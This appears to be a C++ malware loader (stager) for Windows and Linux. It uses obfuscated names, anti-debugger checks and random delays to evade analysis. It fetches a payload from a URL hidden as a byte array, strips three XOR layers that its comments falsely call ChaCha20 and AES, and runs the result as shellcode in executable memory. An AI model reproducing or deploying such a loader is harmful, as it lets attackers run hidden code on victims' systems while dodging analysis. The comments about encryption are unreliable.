#include <iostream>
#include <vector>
#include <cstring>
#include <cstdint>
#include <chrono>
#include <thread>
#include <random>
#include <fstream>
#ifdef _WIN32
#include <windows.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")
#else
#include <curl/curl.h>
#endif
#ifdef _WIN32
#include <windows.h>
#else
#include <sys/mman.h>
#include <unistd.h>
#endif

bool dataFactory3887() {
#ifdef _WIN32
    if (IsDebuggerPresent()) return true;
    BOOL debugged = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugged);
    return debugged;
#else
    FILE* f = fopen("/proc/self/status", "r");
    if (!f) return false;
    char line[256];
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, "TracerPid:", 10) == 0) {
            fclose(f);
            return atoi(line + 10) != 0;
        }
    }
    fclose(f);
    return false;
#endif
}

std::vector<uint8_t> sysRunner6820(const char* url) {
    std::vector<uint8_t> data;
#ifdef _WIN32
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return data;
    HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) {
        InternetCloseHandle(hInternet);
        return data;
    }
    char buffer[4096];
    DWORD bytesRead;
    while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        data.insert(data.end(), buffer, buffer + bytesRead);
    }
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);
#else
    // Linux implementation would use curl
#endif
    return data;
}

int main() {
    // Random delay
    {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dist(1, 999);
        std::this_thread::sleep_for(std::chrono::milliseconds(dist(gen)));
    }

    if (dataFactory3887()) return 0;

    std::vector<uint8_t> refCore291;
    // Download payload
    char objHelper533[] = {104,116,116,112,115,58,47,47,101,120,97,109,112,108,101,46,99,111,109,47,112,97,121,108,111,97,100,46,101,120,101, 0};
    refCore291 = sysRunner6820(objHelper533);
    if (refCore291.empty()) return 1;

    // Decrypt payload
    unsigned char methRunner1718[] = {0xf6, 0x59, 0x4c, 0xd1, 0xee, 0xd1, 0x3e, 0x1a, 0x4b, 0x70, 0xf4, 0xbf, 0xc7, 0xbf, 0xaf, 0x50};
    unsigned char cmpBase9281[] = {0x41, 0x0b, 0x3e, 0x38, 0xfc, 0x1c, 0x9f, 0x4d, 0x0b, 0xed, 0xfd, 0xfb, 0x90, 0x54, 0xc7, 0xa1, 0x2d, 0x46, 0x0d, 0x80, 0x1e, 0x6d, 0x5a, 0x61, 0xc2, 0xb2, 0x57, 0xc6, 0x5c, 0xb8, 0xac, 0x45};
    unsigned char funcHelper6724[] = {0xb9, 0x04, 0xe4, 0x56, 0x91, 0x70, 0x70, 0x98, 0xec, 0x4f, 0xd6, 0x2c, 0x2c, 0x7c, 0x77, 0x84, 0xb8};

    // Decrypt XOR layer
    for (size_t i = 0; i < refCore291.size(); i++) {
        refCore291[i] ^= funcHelper6724[i % sizeof(funcHelper6724)];
    }

    // Micro-delay
    std::this_thread::sleep_for(std::chrono::microseconds(rand() % 100));

    // Decrypt ChaCha20 layer
    for (size_t i = 0; i < refCore291.size(); i++) {
        refCore291[i] ^= cmpBase9281[i % sizeof(cmpBase9281)];
    }

    // Micro-delay
    std::this_thread::sleep_for(std::chrono::microseconds(rand() % 100));

    // Decrypt AES layer
    for (size_t i = 0; i < refCore291.size(); i++) {
        refCore291[i] ^= methRunner1718[i % sizeof(methRunner1718)];
    }

    // Execute in memory
#ifdef _WIN32
    void* instFactory5344 = VirtualAlloc(0, refCore291.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!instFactory5344) return 1;
    memcpy(instFactory5344, refCore291.data(), refCore291.size());
    DWORD oldProtect;
    VirtualProtect(instFactory5344, refCore291.size(), PAGE_EXECUTE_READ, &oldProtect);
    std::this_thread::sleep_for(std::chrono::milliseconds(rand() % 100));
    ((void(*)())instFactory5344)();
#else
    void* instFactory5344 = mmap(0, refCore291.size(), PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (instFactory5344 == MAP_FAILED) return 1;
    memcpy(instFactory5344, refCore291.data(), refCore291.size());
    mprotect(instFactory5344, refCore291.size(), PROT_READ | PROT_EXEC);
    std::this_thread::sleep_for(std::chrono::milliseconds(rand() % 100));
    ((void(*)())instFactory5344)();
#endif
    return 0;
}
